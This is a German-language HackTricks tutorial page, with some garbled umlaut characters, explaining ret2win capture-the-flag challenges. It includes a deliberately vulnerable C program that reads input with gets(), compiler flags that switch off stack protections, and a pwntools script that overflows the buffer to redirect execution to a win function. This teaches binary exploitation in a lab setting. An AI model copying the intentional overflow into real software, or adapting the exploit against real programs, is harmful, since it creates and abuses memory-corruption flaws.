# Ret2win

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Grundlegende Informationen

**Ret2win**-Herausforderungen sind eine beliebte Kategorie in **Capture The Flag (CTF)**-Wettbewerben, insbesondere bei Aufgaben, die **bin√§re Ausnutzung** beinhalten. Das Ziel besteht darin, eine Schwachstelle in einem gegebenen Bin√§rfile auszunutzen, um eine bestimmte, nicht aufgerufene Funktion innerhalb des Bin√§rs auszuf√ºhren, die oft etwas wie `win`, `ret2win` usw. genannt wird. Diese Funktion gibt in der Regel eine Flagge oder eine Erfolgsmeldung aus, wenn sie ausgef√ºhrt wird. Die Herausforderung beinhaltet in der Regel das √úberschreiben der **R√ºckgabeadresse** auf dem Stack, um den Ausf√ºhrungsfluss zur gew√ºnschten Funktion umzuleiten. Hier ist eine detailliertere Erkl√§rung mit Beispielen:

### C-Beispiel

Betrachten Sie ein einfaches C-Programm mit einer Schwachstelle und einer `win`-Funktion, die wir aufrufen m√∂chten:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Um dieses Programm ohne Stack-Schutz und mit deaktiviertem **ASLR** zu kompilieren, k√∂nnen Sie den folgenden Befehl verwenden:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Kompiliere das Programm als 32-Bit-Bin√§rdatei (dies ist optional, aber √ºblich bei CTF-Herausforderungen).
* `-fno-stack-protector`: Deaktiviere Schutzma√ünahmen gegen Stack-√úberl√§ufe.
* `-z execstack`: Erlaube die Ausf√ºhrung von Code auf dem Stack.
* `-no-pie`: Deaktiviere Position Independent Executable, um sicherzustellen, dass die Adresse der `win`-Funktion nicht ge√§ndert wird.
* `-o vulnerable`: Benenne die Ausgabedatei als `vulnerable`.

### Python-Exploit mit Pwntools

F√ºr den Exploit verwenden wir **pwntools**, ein leistungsstarkes CTF-Framework zum Schreiben von Exploits. Das Exploit-Skript wird ein Payload erstellen, um den Puffer zu √ºberlaufen und die R√ºcksprungadresse mit der Adresse der `win`-Funktion zu √ºberschreiben.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Um die Adresse der `win`-Funktion zu finden, k√∂nnen Sie **gdb**, **objdump** oder ein anderes Tool verwenden, das es Ihnen erm√∂glicht, Bin√§rdateien zu inspizieren. Zum Beispiel k√∂nnten Sie mit `objdump` folgendes verwenden:
```sh
objdump -d vulnerable | grep win
```
Dieser Befehl zeigt Ihnen die Assembly des `win`-Funktion, einschlie√ülich ihrer Startadresse.

Das Python-Skript sendet eine sorgf√§ltig erstellte Nachricht, die, wenn sie von der `vulnerable_function` verarbeitet wird, den Puffer √ºberl√§uft und die R√ºckkehradresse auf dem Stapel mit der Adresse von `win` √ºberschreibt. Wenn `vulnerable_function` zur√ºckkehrt, anstatt zu `main` zur√ºckzukehren oder zu beenden, springt es zu `win`, und die Nachricht wird gedruckt.

## Schutzma√ünahmen

* [**ASLR**](../common-binary-protections/aslr.md) **sollte deaktiviert sein**, damit die Adresse √ºber Ausf√ºhrungen hinweg zuverl√§ssig ist, oder die Adresse, an der die Funktion gespeichert wird, ist nicht immer gleich und Sie br√§uchten ein Leck, um herauszufinden, wo die win-Funktion geladen ist.
* [**Stack Canaries**](../common-binary-protections/stack-canaries.md) sollten ebenfalls deaktiviert sein, da die kompromittierte EIP-R√ºckkehradresse niemals befolgt wird.

## Weitere Beispiele & Referenzen

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks in PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
